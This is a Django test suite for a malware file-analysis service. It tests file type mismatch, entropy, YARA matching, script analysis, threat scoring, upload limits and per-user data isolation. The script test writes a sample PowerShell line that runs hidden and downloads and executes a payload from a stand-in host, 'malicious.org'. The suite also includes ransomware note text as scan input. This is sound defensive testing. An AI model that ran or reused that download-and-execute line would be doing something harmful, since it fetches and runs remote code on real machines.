import os
import io
import unittest
from unittest.mock import patch, MagicMock
from django.test import TestCase
from django.contrib.auth import get_user_model
from django.core.files.uploadedfile import SimpleUploadedFile
from rest_framework.test import APIClient
from rest_framework import status

from scanner.models import FileAnalysis
from scanner.services.file_analyzer.file_type_detector import detect_file_type
from scanner.services.file_analyzer.entropy_calculator import calculate_entropy
from scanner.services.file_analyzer.yara_engine import LocalYaraEngine
from scanner.services.file_analyzer.pe_analyzer import analyze_pe_header
from scanner.services.file_analyzer.script_analyzer import analyze_script
from scanner.services.file_analyzer.document_analyzer import analyze_document
from scanner.services.file_analyzer.archive_analyzer import analyze_archive
from scanner.services.file_analyzer.scoring import calculate_file_threat_score
from scanner.services.file_analyzer.service import FileAnalyzerService
from scanner.services.threat_intel.virustotal import VirusTotalProvider

User = get_user_model()


class FileAnalyzerUnitTests(TestCase):
    """Test static analysis engines (file type detection, entropy, YARA, PE, Script, Document, Archive, Scoring)."""

    def test_file_type_magic_detection_and_mismatch(self):
        # Create temporary file with .pdf extension but MZ header
        test_file = os.path.join(os.path.dirname(__file__), 'temp_mismatch.pdf')
        with open(test_file, 'wb') as f:
            f.write(b'MZ\x90\x00\x03\x00\x00\x00') # Executable header!

        try:
            res = detect_file_type(test_file, "invoice.pdf")
            self.assertEqual(res["detected_type"], "PE")
            self.assertTrue(res["mismatch_detected"])
        finally:
            if os.path.exists(test_file):
                os.remove(test_file)

    def test_entropy_calculation(self):
        test_file = os.path.join(os.path.dirname(__file__), 'temp_entropy.txt')
        with open(test_file, 'wb') as f:
            # Repeating bytes -> low entropy
            f.write(b'AAAA' * 100)

        try:
            res = calculate_entropy(test_file)
            self.assertEqual(res["category"], "LOW")
            self.assertLess(res["entropy"], 2.0)
        finally:
            if os.path.exists(test_file):
                os.remove(test_file)

    def test_yara_rule_matching(self):
        test_file = os.path.join(os.path.dirname(__file__), 'temp_yara.txt')
        with open(test_file, 'wb') as f:
            # Ransomware extortion note strings
            f.write(b'Attention! Your files have been encrypted! Download Tor Browser to restore your files and send Bitcoin.')

        try:
            engine = LocalYaraEngine()
            res = engine.scan_file(test_file)
            self.assertEqual(res["status"], "MATCH")
            self.assertGreaterEqual(len(res["matches"]), 1)
            self.assertEqual(res["matches"][0]["rule_name"], "Ransomware_Note_Strings")
        finally:
            if os.path.exists(test_file):
                os.remove(test_file)

    def test_script_analyzer(self):
        test_file = os.path.join(os.path.dirname(__file__), 'temp_script.ps1')
        with open(test_file, 'w') as f:
            f.write('powershell.exe -EncodedCommand QmFzZTY0VGVzdA== -nop -w hidden; Invoke-Expression (Net.WebClient).DownloadString("http://malicious.org/payload.ps1")')

        try:
            res = analyze_script(test_file)
            self.assertTrue(res["is_script"])
            self.assertTrue(res["is_obfuscated"])
            self.assertGreaterEqual(len(res["indicators"]), 2)
        finally:
            if os.path.exists(test_file):
                os.remove(test_file)

    def test_deterministic_scoring(self):
        type_info = {"mismatch_detected": True, "detected_type": "PE", "extension": ".pdf"}
        entropy_info = {"entropy": 7.5, "category": "HIGH"}
        yara_info = {"matches": [{"rule_name": "Mimikatz_LSASS_Memory_Dumper", "score": 40, "severity": "CRITICAL"}]}
        pe_info = {"is_pe": True, "suspicious_sections": ["UPX0"], "suspicious_api_imports": ["VirtualAllocEx"], "has_digital_signature": False}
        vt_info = {"status": "SUCCESS", "malicious": 10, "suspicious": 2}

        score, severity, confidence, summary = calculate_file_threat_score(
            type_info, entropy_info, yara_info, pe_info, {}, {}, {}, vt_info
        )

        self.assertGreaterEqual(score, 75)
        self.assertEqual(severity, "CRITICAL")
        self.assertGreaterEqual(confidence, 80)


class SecurityAndIsolationFileAPITests(TestCase):
    """Test Upload Security, Max Size, User Data Isolation, user_id spoofing, RBAC (Steps 2, 3, 5, 23, 24, 37, 38)."""

    def setUp(self):
        self.user_a = User.objects.create_user(username="usera", password="Password123!", role="USER", status="ACTIVE", is_active=True)
        self.user_b = User.objects.create_user(username="userb", password="Password123!", role="USER", status="ACTIVE", is_active=True)
        self.admin = User.objects.create_user(username="adminuser", password="Password123!", role="ADMIN", status="ACTIVE", is_active=True, is_staff=True)

        self.client_a = APIClient()
        self.client_a.force_authenticate(user=self.user_a)

        self.client_b = APIClient()
        self.client_b.force_authenticate(user=self.user_b)

        self.client_admin = APIClient()
        self.client_admin.force_authenticate(user=self.admin)

    @patch.object(VirusTotalProvider, "scan")
    def test_secure_file_upload_and_analysis(self, mock_vt):
        mock_vt.return_value = {"provider": "VirusTotal", "status": "SUCCESS", "malicious": 0, "suspicious": 0, "harmless": 50, "undetected": 0}

        sample_file = SimpleUploadedFile("sample_script.py", b"import os\nprint('Clean Python Script')", content_type="text/plain")

        response = self.client_a.post("/api/file-analysis/analyze/", {"file": sample_file}, format="multipart")
        
        self.assertEqual(response.status_code, status.HTTP_201_CREATED)
        self.assertEqual(response.data["original_filename"], "sample_script.py")
        self.assertEqual(response.data["detected_type"], "SCRIPT")
        self.assertIn("sha256", response.data)
        
        # Verify stored filename uses random UUID (non-public safe storage)
        self.assertNotEqual(response.data["stored_filename"], "sample_script.py")
        self.assertTrue(response.data["stored_filename"].endswith(".py"))

    @patch.object(VirusTotalProvider, "scan")
    def test_oversized_file_rejected(self, mock_vt):
        service = FileAnalyzerService()
        mock_file = MagicMock()
        mock_file.name = "oversized_file.bin"
        mock_file.size = 30 * 1024 * 1024 # 30 MB

        with self.assertRaises(ValueError) as ctx:
            service.analyze_uploaded_file(mock_file, self.user_a)
        self.assertIn("exceeds maximum limit", str(ctx.exception))

    @patch.object(VirusTotalProvider, "scan")
    def test_user_data_isolation(self, mock_vt):
        mock_vt.return_value = {"provider": "VirusTotal", "status": "SUCCESS", "malicious": 0, "suspicious": 0}

        file_a = SimpleUploadedFile("user_a_doc.pdf", b"%PDF-1.5 Sample Content", content_type="application/pdf")
        resp_a = self.client_a.post("/api/file-analysis/analyze/", {"file": file_a}, format="multipart")
        record_a_id = resp_a.data["id"]

        # User A can view own file analysis
        detail_a = self.client_a.get(f"/api/file-analysis/{record_a_id}/")
        self.assertEqual(detail_a.status_code, status.HTTP_200_OK)

        # User B CANNOT access User A's file analysis (returns 404)
        detail_b = self.client_b.get(f"/api/file-analysis/{record_a_id}/")
        self.assertEqual(detail_b.status_code, status.HTTP_404_NOT_FOUND)

        # User B history list DOES NOT contain User A's file analysis
        hist_b = self.client_b.get("/api/file-analysis/history/")
        self.assertEqual(hist_b.status_code, status.HTTP_200_OK)
        self.assertEqual(len(hist_b.data), 0)

    @patch.object(VirusTotalProvider, "scan")
    def test_user_id_spoofing_prevented(self, mock_vt):
        mock_vt.return_value = {"provider": "VirusTotal", "status": "SUCCESS", "malicious": 0, "suspicious": 0}

        file_obj = SimpleUploadedFile("spoof_test.txt", b"Hello World", content_type="text/plain")
        
        # Client tries to pass user_id = user_b.id
        payload = {"file": file_obj, "user_id": self.user_b.id}
        response = self.client_a.post("/api/file-analysis/analyze/", payload, format="multipart")

        self.assertEqual(response.status_code, status.HTTP_201_CREATED)
        # Verify saved record belongs strictly to authenticated user_a
        saved_record = FileAnalysis.objects.get(id=response.data["id"])
        self.assertEqual(saved_record.user, self.user_a)

    def test_normal_user_denied_admin_endpoint(self):
        response = self.client_a.get("/api/admin/file-analysis/")
        self.assertEqual(response.status_code, status.HTTP_403_FORBIDDEN)

    def test_admin_can_access_platform_wide_file_analyses(self):
        # Create record owned by User A
        FileAnalysis.objects.create(
            user=self.user_a,
            original_filename="platform_file.exe",
            stored_filename="uuid123.exe",
            sha256="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            detected_type="PE",
            threat_score=85,
            severity="CRITICAL"
        )

        response = self.client_admin.get("/api/admin/file-analysis/")
        self.assertEqual(response.status_code, status.HTTP_200_OK)
        self.assertGreaterEqual(len(response.data), 1)
        self.assertEqual(response.data[0]["original_filename"], "platform_file.exe")
